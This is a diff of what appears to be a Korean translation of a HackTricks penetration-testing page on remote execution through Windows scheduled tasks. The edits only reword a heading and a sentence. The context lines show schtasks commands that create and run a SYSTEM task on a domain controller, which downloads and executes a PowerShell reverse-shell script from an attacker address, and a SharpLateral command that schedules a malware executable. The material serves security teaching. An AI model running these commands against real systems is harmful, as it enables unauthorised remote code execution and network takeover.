@@ -2,7 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## 작동 방식
+## How Does it works
 
 At는 사용자 이름/(비밀번호/해시)를 알고 있는 호스트에서 작업을 예약할 수 있습니다. 따라서 이를 사용하여 다른 호스트에서 명령을 실행하고 출력을 얻을 수 있습니다.
 ```
@@ -18,7 +18,7 @@ schtasks /run /tn <TASK_NAME> /S <VICTIM>
 schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
 schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
 ```
-당신은 또한 [SharpLateral](https://github.com/mertdas/SharpLateral)을 사용할 수 있습니다:
+또한 [SharpLateral](https://github.com/mertdas/SharpLateral)을 사용할 수 있습니다:
 ```bash
 SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
 ```
